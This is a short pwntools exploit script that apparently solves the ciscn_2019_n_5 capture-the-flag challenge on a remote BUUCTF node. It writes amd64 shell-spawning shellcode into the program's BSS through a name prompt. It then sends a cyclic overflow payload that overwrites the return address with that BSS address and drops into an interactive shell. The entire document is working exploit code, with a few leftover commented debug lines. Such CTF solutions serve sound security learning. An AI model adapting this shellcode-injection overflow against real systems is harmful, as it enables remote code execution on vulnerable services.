from pwn import *
context.log_level='debug'
context.arch="amd64"
io  =remote('node3.buuoj.cn',25892)
elf = ELF('./ciscn_2019_n_5')
bss_adr = elf.bss()+0x20
name = asm(shellcraft.amd64.sh())
payload = cyclic(0x20+8)+p64(bss_adr)
io.recvuntil(b'your name')
io.sendline(name)
io.recvuntil(b'to say to me?')
io.sendline(payload)
io.interactive()
#puts_addr =int(io.recvuntil(b'\n',drop=True),16)
#print(puts_addr)
#print('asdfasdf')
